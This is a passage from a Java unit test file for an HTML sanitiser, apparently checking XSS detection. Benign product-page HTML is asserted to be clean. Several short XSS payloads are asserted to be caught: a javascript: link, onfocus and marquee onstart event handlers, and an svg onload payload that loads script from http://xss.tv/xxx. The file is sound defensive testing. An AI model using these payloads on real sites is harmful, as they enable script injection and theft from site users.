                        + "ions (product, material, size,&nbsp;<br />quantity etc.). We usually quote within 6 hours. Please call us or inform in your email when it is urgent, we will<br />regard your inquiry prio\n"
                        + "rity.<br /><br /><span style=\"color:#006600;\"><strong>2. How can I get samples?</strong></span></span><br /><span style=\"font-size:14px;\">We provide samples per your requests. Sample\n"
                        + " charge required and freight collected. Sample charge<br />refundable after order placed and the quantity reaches the requirement. Free sample provided of which<br />products already exi\n"
                        + "sted or easy to make.</span><br /><br /><span style=\"font-size:16px;\"><span style=\"color:#006600;\"><strong>3. How long can I expect to get the sample?</strong></span></span><br /><sp\n"
                        + "an style=\"font-size:14px;\">Samples will be ready for delivery in 3-8days. 3-8days to reach via express such as DHL, FEDEX, UPS.</span><br /><br /><span style=\"font-size:16px;\"><span \n"
                        + "style=\"color:#006600;\"><strong>4. What kinds of files do you accept for OEM?</strong></span></span><br /><span style=\"font-size:14px;\">PDF, CDR, AI, high resolution JPG</span><br /><\n"
                        + "br /><span style=\"font-size:16px;\"><span style=\"color:#006600;\"><strong>5. Can you do the designs for us?</strong></span></span><br /><span style=\"font-size:14px;\">Design service a\n"
                        + "vailable. State your ideas and send us high resolution images, your Logo and text, we will<br />help to carry out your ideas and send you finished files for confirmation.</span><br /><br\n"
                        + " /><span style=\"font-size:16px;\"><span style=\"color:#006600;\"><strong>6. How to order?</strong></span></span><br /><span style=\"font-size:14px;\">1)Product information-Quantity, Spe\n"
                        + "cification(Size,Material,Technological and Packing requirements etc.)<br />2)Delivery time. Shipping information-Company name, Street address, Phone&amp;Fax number, Destination<br />sea \n"
                        + "port.<br />3)Forwarder's contact details if there's any in China.</span><br /><br /><span style=\"font-size:16px;\"><span style=\"color:#006600;\"><strong>7. What about the lead time for\n"
                        + " mass production?</strong></span></span><br /><span style=\"font-size:14px;\">Normally 15-25 days, depends on the quantity and the season. Our suggestion: inquiry and place order 2 month\n"
                        + "s<br />earlier before you need the goods arrived.</span><br /><br /><span style=\"font-size:16px;\"><span style=\"color:#006600;\"><strong>8. What is your term of delivery?</strong></spa\n"
                        + "n></span><br /><span style=\"font-size:14px;\">We accept EXW, FOB, CIF, etc. Choose the one which is the most convenient or cost effective for you.</span>\"";
        Assert.assertFalse(testXssWithAttr(content));

        content =
                "<br /><u><span style=\"color:#0066cc;\"><span style=\"font-size:24px;\"><strong>Equipment Introduct\n"
                        + "ion</strong></span></span></u><br /><br /><span style=\"font-size:18px;\"><span style=\"color:#990000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong><span style=\"f\n"
                        + "ont-family:Arial, Helvetica, sans-serif;\"><strong>Working principle:</strong></span></strong></span></span><br /><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong><span \n"
                        + "style=\"font-family:Arial, Helvetica, sans-serif;\"><strong>The basket washing machine is washed with high pressure spray. The main cleaning agent is about 80 </strong></span></strong><s\n"
                        + "trong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong>&ordm;C</strong></span></strong><strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong>&nbsp;ho\n"
                        + "t alkali water, and the main cleaning force is about 80 </strong></span></strong><strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong>&ordm;C</strong></span></strong\n"
                        + "><strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong>&nbsp;hot water. The circulating water tank is sprinkled with horizontal stainless steel centrifugal pump, and \n"
                        + "the basket is flushed from the upper, lower, left and right four directions. They are equipped with two filtering devices to clean up booty at any time. There are separate draining and c\n"
                        + "leaning valves for each water tank, and the same discharge is cut off after discharge. The equipment consists of hot alkali water spray section, hot water spray section, clean water spra\n"
                        + "y section, disinfection water spray section and drying section, in which the spray section and drying section of the disinfectant water can be matched according to the requirements of th\n"
                        + "e customer.<br /><br /><img srcid=\"121172932\" /></strong></span></strong></span><br /><br /><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong><img srcid=\"121172942\" /\n"
                        + "></strong></span><br /><br /><span style=\"color:#990000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><s\n"
                        + "trong>Scope of application:</strong></span></strong></span></span><br /><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong><span style=\"font-family:Arial, Helvetica, sans\n"
                        + "-serif;\"><strong>The basket washing machine is mainly used for slaughtering, meat, poultry, vegetables, fruits, drinks, brewing and other food processing plants, food logistics centers \n"
                        + "and distribution centers. It is suitable for cleaning and sterilizing all kinds of baskets, pallets, boxes and so on, so as to prevent the pollution of food.</strong></span></strong></sp\n"
                        + "an><br /><br /><br /><img srcid=\"121172952\" /><br /><img srcid=\"121172962\" /><br /><br /><br /><br /><br /><br /><br /><span style=\"color:#990000;\"><span style=\"font-family:Arial,\n"
                        + " Helvetica, sans-serif;\"><strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong>Equipment features:</strong></span></strong></span></span><br /><span style=\"font-fam\n"
                        + "ily:Arial, Helvetica, sans-serif;\"><strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong>1. the washing machine is made of SUS304 stainless steel except for motors, \n"
                        + "motor supports and nozzles, and the nozzle is temperature fast dismantling plastic nozzle.</strong></span></strong></span><br /><span style=\"font-family:Arial, Helvetica, sans-serif;\">\n"
                        + "<strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong>2. water tanks are cleaned by the horizontal stainless steel centrifugal pump, and the baskets are sprinkled at \n"
                        + "the same four directions at the same time. The water tank has two filter devices to clean up the stolen goods at any time; the water tank has a separate discharge valve and the pipe is d\n"
                        + "ischarged in a uniform discharge.</strong></span></strong></span><br /><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong><span style=\"font-family:Arial, Helvetica, sans-\n"
                        + "serif;\"><strong>3. groups were divided into three groups of spray tubes, the first group was hot alkaline water, the second group was 80 </strong></span></strong><strong>&nbsp;</strong>\n"
                        + "<strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong>&ordm;C</strong></span></strong><strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong>&nbsp;\n"
                        + "hot water and the third group was tap water. Each group had a double double filter water tank. The third sets of tap water were recycled to second water tank, and some dirty water was di\n"
                        + "scharged after heating. The first and second water tanks had steam heating pipes in the first and second tanks, and the temperature was from normal to 95</strong></span></strong><strong>\n"
                        + "&nbsp;</strong><strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><span style=\"color:#000000;\"><strong>degree&nbsp;</strong></span></span></strong><strong><span style=\"\n"
                        + "font-family:Arial, Helvetica, sans-serif;\"><span style=\"color:#000000;\"><strong>centigrade</strong></span></span></strong><strong><span style=\"font-family:Arial, Helvetica, sans-seri\n"
                        + "f;\"><strong>&nbsp;. Free setting, automatic temperature control.</strong></span></strong></span><br /><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong><span style=\"fon\n"
                        + "t-family:Arial, Helvetica, sans-serif;\"><strong>4.</strong></span></strong><strong>&nbsp;</strong><strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong>&nbsp;the two\n"
                        + " sides of the washing room are movable waterproof doors, and the two ends are sealed with soft curtain to prevent water from splashing, so that they can be cleaned and repaired at any ti\n"
                        + "me.</strong></span></strong></span><br /><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong>5.</strong></\n"
                        + "span></strong><strong>&nbsp;</strong><strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><strong>the equipment is equipped with stainless steel electrical control box, all \n"
                        + "power centralized control.</strong></span></strong></span></span><br /><br /><br /><img srcid=\"121172972\" /><br /><br />&nbsp;\"";
        Assert.assertFalse(testXssWithAttr(content));

        content = "<br /><span style=\"font-size:20px;\"><u><span style=\"color:#006600;\"><strong><strong><span styl\n"
                + "e=\"font-family:Arial, Helvetica, sans-serif;\">Product Description</span></strong></strong></span></u></span><br /><br /><strong><span style=\"color:#6600cc;\">GENERAL DESCRIPTION</span\n"
                + "><br />MC hot air circulating oven uses is equipped with low-noise and thermostable axial flow fan and automatic temperature control system. The entire circulatory system is sealed, impr\n"
                + "oving the thermal efficiency of oven from traditional 3-7% in drying room to the current 35-45%, with the highest thermal efficiency up to 50%. The design success of GR hot air circulati\n"
                + "ng oven make our hot air circulation oven has reached the advanced level at home and abroad. It has saved a lot of energy for our country and improved the economic efficiency of enterpri\n"
                + "ses.&nbsp;</strong><br /><br />&nbsp;<img srcid=\"112133832\" /><br /><br /><br /><br /><strong><strong><span style=\"font-size:24px;\"><span style=\"color:#333399;\"><span style=\"font-\n"
                + "family:Arial, Helvetica, sans-serif;\">Equipment</span></span></span></strong></strong><strong><strong><span style=\"font-size:24px;\"><span style=\"color:#333399;\"><span style=\"font-f\n"
                + "amily:Arial, Helvetica, sans-serif;\">&nbsp;P</span></span></span></strong></strong><strong><strong><span style=\"font-size:24px;\"><span style=\"color:#333399;\"><span style=\"font-fami\n"
                + "ly:Arial, Helvetica, sans-serif;\">arameter</span></span></span></strong></strong><table style=\"width:779px;\"><tbody><tr><td style=\"width:55px;\"><span style=\"font-size:12px;\"><span\n"
                + " style=\"font-family:Calibri;\">M</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">odel</span></span></td><td style=\"width:72px;\">\n"
                + "<span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">S</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">ize</span></\n"
                + "span></td><td style=\"width:38px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Cart(set)</span></span></td><td style=\"width:65px;\"><span \n"
                + "style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">B</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">aking pan(Piece)</\n"
                + "span></span></td><td style=\"width:65px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">P</span></span><span style=\"font-size:12px;\"><span style=\"font-family:A\n"
                + "rial, Helvetica, sans-serif;\">ower source</span></span></td><td style=\"width:68px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">H</span></span><span style=\"f\n"
                + "ont-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">eating method</span></span></td><td style=\"width:79px;\"><span style=\"font-size:12px;\"><span style=\"font-fa\n"
                + "mily:Calibri;\">O</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">perating temperature</span></span></td><td style=\"width:65px;\">\n"
                + "<span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">S</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">ize of bakin\n"
                + "g pan</span></span></td><td style=\"width:70px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">C</span></span><span style=\"font-size:12px;\"><span style=\"font-f\n"
                + "amily:Arial, Helvetica, sans-serif;\">ontrol system</span></span></td><td style=\"width:153px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">S</span></span><span\n"
                + " style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">team pressure</span></span></td><td style=\"width:51px;\"><span style=\"font-size:12px;\"><span style\n"
                + "=\"font-family:Calibri;\">W</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">eight</span></span><span style=\"font-size:12px;\"><spa\n"
                + "n style=\"font-family:Arial, Helvetica, sans-serif;\">/kg</span></span>&nbsp;</td></tr><tr><td style=\"width:55px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helv\n"
                + "etica, sans-serif;\">MC-HG</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">F</span></span><span style=\"font-size:12px;\"><span sty\n"
                + "le=\"font-family:Arial, Helvetica, sans-serif;\">-24</span></span></td><td style=\"width:72px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\"\n"
                + ">1400*1400*2600mm</span></span></td><td style=\"width:38px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">1</span></span></td><td style=\"wi\n"
                + "dth:65px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">24</span></span></td><td rowspan=\"6\" style=\"width:65px;\"><span style=\"font-size\n"
                + ":12px;\"><span style=\"font-family:Calibri;\">C</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">ustomize</span></span><br />&nbsp;<\n"
                + "/td><td rowspan=\"6\" style=\"width:68px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">S</span></span><span style=\"font-size:12px;\"><span style=\"font-family:\n"
                + "Arial, Helvetica, sans-serif;\">team heating or electrical heating</span></span></td><td rowspan=\"6\" style=\"width:79px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Ari\n"
                + "al, Helvetica, sans-serif;\">0-</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">3</span></span><span style=\"font-size:12px;\"><spa\n"
                + "n style=\"font-family:Arial, Helvetica, sans-serif;\">00<span style=\"font-family:Arial, Helvetica, sans-serif;\">&ordm;C</span></span></span></td><td rowspan=\"6\" style=\"width:65px;\"\n"
                + "><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">64</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, san\n"
                + "s-serif;\">0*</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">46</span></span><span style=\"font-size:12px;\"><span style=\"font-fa\n"
                + "mily:Arial, Helvetica, sans-serif;\">0*45mm</span></span></td><td rowspan=\"6\" style=\"width:70px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">A</span></span>\n"
                + "<span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">utomatic control</span></span></td><td style=\"width:153px;\"><span style=\"font-size:12px;\"><s\n"
                + "pan style=\"font-family:Arial, Helvetica, sans-serif;\">10.0.2-0.8Mpa(2-8kg/com)</span></span></td><td style=\"width:51px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Ari\n"
                + "al, Helvetica, sans-serif;\">500</span></span></td></tr><tr><td style=\"width:55px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">MC-HG</spa\n"
                + "n></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">F</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helveti\n"
                + "ca, sans-serif;\">-48</span></span></td><td style=\"width:72px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">1400*2400*2600mm</span></span>\n"
                + "</td><td style=\"width:38px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">2</span></span></td><td style=\"width:65px;\"><span style=\"font-\n"
                + "size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">48</span></span></td><td style=\"width:153px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, He\n"
                + "lvetica, sans-serif;\">11.0.2-0.8Mpa(2-8kg/com)</span></span></td><td style=\"width:51px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">8</s\n"
                + "pan></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">00</span></span></td></tr><tr><td style=\"width:55px;\"><span style=\"font-size:12px;\n"
                + "\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">MC-HG</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">F</span></span><\n"
                + "span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">-96</span></span></td><td style=\"width:72px;\"><span style=\"font-size:12px;\"><span style=\"fon\n"
                + "t-family:Arial, Helvetica, sans-serif;\">2400*2400*2600mm</span></span></td><td style=\"width:38px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-ser\n"
                + "if;\">4</span></span></td><td style=\"width:65px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">96</span></span></td><td style=\"width:153px\n"
                + ";\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">12.0.2-0.8Mpa(2-8kg/com)</span></span></td><td style=\"width:51px;\"><span style=\"font-size\n"
                + ":12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">1</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">0</span></span\n"
                + "><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">00</span></span></td></tr><tr><td style=\"width:55px;\"><span style=\"font-size:12px;\"><span s\n"
                + "tyle=\"font-family:Arial, Helvetica, sans-serif;\">MC-HG</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">F</span></span><span style\n"
                + "=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">-144</span></span></td><td style=\"width:72px;\"><span style=\"font-size:12px;\"><span style=\"font-family:\n"
                + "Arial, Helvetica, sans-serif;\">3500*2400*2600mm</span></span></td><td style=\"width:38px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">6</\n"
                + "span></span></td><td style=\"width:65px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">144</span></span></td><td style=\"width:153px;\"><spa\n"
                + "n style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">13.0.2-0.8Mpa(2-8kg/com)</span></span></td><td style=\"width:51px;\"><span style=\"font-size:12px;\"\n"
                + "><span style=\"font-family:Arial, Helvetica, sans-serif;\">15</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">00</span></span></td>\n"
                + "</tr><tr><td style=\"width:55px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">MC-HG</span></span><span style=\"font-size:12px;\"><span styl\n"
                + "e=\"font-family:Arial, Helvetica, sans-serif;\">F</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">-192</span></span></td><td style=\n"
                + "\"width:72px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">4500*2400*2600mm</span></span></td><td style=\"width:38px;\"><span style=\"font-\n"
                + "size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">8</span></span></td><td style=\"width:65px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helv\n"
                + "etica, sans-serif;\">192</span></span></td><td style=\"width:153px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">14.0.2-0.8Mpa(2-8kg/com)</\n"
                + "span></span></td><td style=\"width:51px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">20</span></span><span style=\"font-size:12px;\"><span\n"
                + " style=\"font-family:Arial, Helvetica, sans-serif;\">00</span></span></td></tr><tr><td style=\"width:55px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, s\n"
                + "ans-serif;\">MC-HG</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">F</span></span><span style=\"font-size:12px;\"><span style=\"fon\n"
                + "t-family:Arial, Helvetica, sans-serif;\">-288</span></span></td><td style=\"width:72px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">5500*2\n"
                + "400*2600mm</span></span></td><td style=\"width:38px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">12</span></span></td><td style=\"width:65\n"
                + "px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">288</span></span></td><td style=\"width:153px;\"><span style=\"font-size:12px;\"><span sty\n"
                + "le=\"font-family:Arial, Helvetica, sans-serif;\">15.0.2-0.8Mpa(2-8kg/com)</span></span></td><td style=\"width:51px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Hel\n"
                + "vetica, sans-serif;\">280</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">0</span></span></td></tr><tr><td style=\"height:33px;widt\n"
                + "h:55px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">N</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">ot\n"
                + "e </span></span></td><td colspan=\"10\" style=\"height:33px;width:725px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">W</span></span><span style=\"font-size:12p\n"
                + "x;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">e can design the equipments depend on the requirements</span></span></td></tr></tbody></table><br /><br /><br /><strong><sp\n"
                + "an style=\"color:#6600cc;\">CHARACTERISTIC</span><br />1. Heating sources include steam, electricity, far infrared, dual-use of steam and electricity, all for users to choose;<br />2. Us\n"
                + "ing temperature: steam heating 50 ~ 140&ordm;C, the highest 150&ordm;C;<br />3. Electricity, far infrared temperature 50 ~ 350&ordm;C;<br />4. It is equipped with automatic control syste\n"
                + "m and computer control system for users to choose;<br />5. Commonly used steam pressure 0.02-0.8Mpa (0.2 ~ 8kg / m2);<br />6. It is equipped with electric heating, valued 15KW calculated\n"
                + " according to type I, practical 5-8kw / h;<br />7. If there is any special requirement please specify in order.<br />Price of non-standard oven is negotiable.<br />Please specify in orde\n"
                + "r if using temperature is more than 140&ordm;C or less than 60&ordm;C.<br />Our baking car and baking tray are in uniform size, so they are interchangeable;<br />Baking tray size: 640 &t\n"
                + "imes; 460 &times; 45 (mm)</strong><br /><br /><img srcid=\"112133842\" /><br /><br /><span style=\"font-size:14px;\"><u><span style=\"color:#006600;\"><strong><strong><span style=\"font-\n"
                + "family:Arial, Helvetica, sans-serif;\">&nbsp;Details for dryer</span></strong></strong></span></u><br /><strong><strong><span style=\"color:#000000;\"><span style=\"font-family:Arial, He\n"
                + "lvetica, sans-serif;\">&nbsp; This equipment is mainly used in drying</span></span></strong></strong>&nbsp;<strong><strong><span style=\"color:#000000;\"><span style=\"font-family:Arial,\n"
                + " Helvetica, sans-serif;\">vegetables, fruit, seafood, flowers, such as ginseng, red ginseng, ginseng, angelica, cordyceps sinensis, honeysuckle, conventional, schisandra, astragalus and \n"
                + "konjac, yam, maize seed, tobacco seeds, pumpkin, onion, spinach, brake, wild, carrots, celery, cowpea, chili, beans, tomatoes, mushrooms, mushrooms, agaric, garlic, ginger, raisins, kiwi\n"
                + " fruit, banana, litchi, longan, apple, hawthorn, persimmon, scallops, dried fish, kelp, vinasse, chrysanthemum, rose dry food processing, etc.&nbsp;</span></span></strong></strong></span\n"
                + "><br /><br /><img srcid=\"112133852\" /><br /><br /><br /><span style=\"font-size:14px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\"><u><strong><span style=\"color:#006600\n"
                + ";\">Features of dryer &nbsp;:</span></strong></u><br /><br /><span style=\"color:#000000;\">1, vegetable drier , high thermal efficiency, save energy.</span><br /><span style=\"color:#00\n"
                + "0000;\">2, the use of forced ventilation effect, and equips with adjustable air distributing plate, uniform material drying,&nbsp;Heat source can use steam, hot water, electricity, far i\n"
                + "nfrared, choose widely.</span><br /><span style=\"color:#000000;\">3, low noise, running balance.Temperature control, easy installation and maintenance.</span></span></span><br /><br /><\n"
                + "br /><br /><span style=\"font-size:20px;\"><strong>&nbsp;</strong></span><br /><span style=\"color:#006600;\"><span style=\"font-size:20px;\"><strong>Service:<br />pre-sale service</stro\n"
                + "ng></span></span><br /><strong>We Invite customers to visit our company and communicate on technical requirements face to face.<br />sale service<br />Responsible for debugging the equip\n"
                + "ment according to customers' requirements of various technical data. Our engineers will train our customers about equipment features and operation key points to make sure the equipment r\n"
                + "unning in the best condition.</strong><br /><br /><span style=\"color:#006600;\"><span style=\"font-size:20px;\"><strong>After-sale service</strong></span></span><br /><strong>We provide\n"
                + " installation, debugging, maintenance, training and other services; Provide relevant technical data, equipment, software and related GMP certification materials;Set up after-sales servic\n"
                + "e hotline, and arrange personnel to visit customers every year to know more customer needs,like customer operation problems in the process of production equipment.</strong><br /><br /><s\n"
                + "pan style=\"color:#006600;\"><span style=\"font-size:20px;\"><strong>Quality promise</strong></span></span><br /><strong>Our company promises strictly operate the ISO9001 quality system \n"
                + "certification standards and pharmaceutical equipment GMP audit requirements,promise we provide new equipment. Advanced technology,good quality.Equipment operation safe reliable, affordab\n"
                + "le, easy to maintain.<br />Equipment warranty period is one year,all the parts for the equipment choose well-known brand.<br />During the warranty when equipment have problem in quality \n"
                + "like equipment failure and damage,the company for free maintenance or replacement.</strong><br /><br /><span style=\"color:#990099;\"><span style=\"font-size:24px;\"><strong>&nbsp; We lo\n"
                + "ok forward to cooperating with partners from all over the world to build win-win cooperation relationship in long term. Welcome for your visiting.</strong></span></span><br /><br /><span\n"
                + " style=\"font-size:24px;\"><strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><img srcid=\"112133862\" /></span></strong></span>\"";
        Assert.assertFalse(testXss(content));
    }

    @Test
    public void testXss8() throws Exception {
        // String content = "<img//onerror='alert(1' src='/adss'> <TABLE> && ,: # %23 SD SSDADA";
        // String content="<img /onerror=alert(1' > ?=+ adad & sda %6d a ";
        String content = "<a href=\"javascript:alert(1)\" >www.baidu.com</a>;";
        Assert.assertTrue(testXssWithAttr(content));
        Assert.assertFalse(getclean(content).contains("nofollow"));
    }

    @Test
    public void testXss9() throws Exception {
        String content =
                "\">><svg/onload=[1].find(function(){with(`docomen\\x74`);body.appendChild(createElement(\"script\")).src=\"http://xss.tv/xxx\"})>";
        Assert.assertTrue(testXssWithAttr(content));

        content = "\" sada\" \" <img src=\"javascript:\" > \"";
        Assert.assertTrue(testXssWithAttr(content));
    }

    @Test
    public void testXss10() throws Exception {
        String content =
                "/images/mail/mail-logo_en.gif></td></tr></tbody></table><table align=></td></tr></tbody><tbody><tr><td style='height:100pf'><strong>To: Yeso Insulating Products Co., Ltd.<br />Dear Ms. Linda Zong ,</strong><p style=><a href='http://Made-in-China.com'>Made-in-China.com</a> would like to let you know that you have just received a new business message which is saved in the <a href='http://membercenter.made-in-china.com/messagecenter.do <br/><br/>";
        Assert.assertTrue(testXssWithAttr(content));
        content = "a=222\" onfocus='alert(1)' />c weq wwqweqw ddd";
        Assert.assertTrue(testXssWithAttr(content));

        content = "a=222\" onfocus  ='alert(1)' />";
        Assert.assertTrue(testXssWithAttr(content));
        content = "a=222\" onfocus  ='alert(1)' />";
        Assert.assertTrue(testXssWithAttr(content));

        content = "adsdds \"><marquee/onstart=confirm(2)>/onstart=confirm(1)>";
        Assert.assertTrue(testXssWithAttr(content));

        content = "adsdds 啊都是全额发放 \"><marquee/onstart=confirm(2)>/onstart=confirm(1)>";
        Assert.assertTrue(testXssWithAttr(content));
    }

    @Test
    public void testXss11() throws Exception {
        String content =
                "<br /><span style=\"font-size:20px;\"><u><span style=\"color:#006600;\"><strong><strong><span styl\n"
                        + "e=\"font-family:Arial, Helvetica, sans-serif;\">Product Description</span></strong></strong></span></u></span><br /><br /><strong><span style=\"color:#6600cc;\">GENERAL DESCRIPTION</span\n"
                        + "><br />MC hot air circulating oven uses is equipped with low-noise and thermostable axial flow fan and automatic temperature control system. The entire circulatory system is sealed, impr\n"
                        + "oving the thermal efficiency of oven from traditional 3-7% in drying room to the current 35-45%, with the highest thermal efficiency up to 50%. The design success of GR hot air circulati\n"
                        + "ng oven make our hot air circulation oven has reached the advanced level at home and abroad. It has saved a lot of energy for our country and improved the economic efficiency of enterpri\n"
                        + "ses.&nbsp;</strong><br /><br />&nbsp;<img srcid=\"112133832\" /><br /><br /><br /><br /><strong><strong><span style=\"font-size:24px;\"><span style=\"color:#333399;\"><span style=\"font-\n"
                        + "family:Arial, Helvetica, sans-serif;\">Equipment</span></span></span></strong></strong><strong><strong><span style=\"font-size:24px;\"><span style=\"color:#333399;\"><span style=\"font-f\n"
                        + "amily:Arial, Helvetica, sans-serif;\">&nbsp;P</span></span></span></strong></strong><strong><strong><span style=\"font-size:24px;\"><span style=\"color:#333399;\"><span style=\"font-fami\n"
                        + "ly:Arial, Helvetica, sans-serif;\">arameter</span></span></span></strong></strong><table style=\"width:779px;\"><tbody><tr><td style=\"width:55px;\"><span style=\"font-size:12px;\"><span\n"
                        + " style=\"font-family:Calibri;\">M</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">odel</span></span></td><td style=\"width:72px;\">\n"
                        + "<span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">S</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">ize</span></\n"
                        + "span></td><td style=\"width:38px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Cart(set)</span></span></td><td style=\"width:65px;\"><span \n"
                        + "style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">B</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">aking pan(Piece)</\n"
                        + "span></span></td><td style=\"width:65px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">P</span></span><span style=\"font-size:12px;\"><span style=\"font-family:A\n"
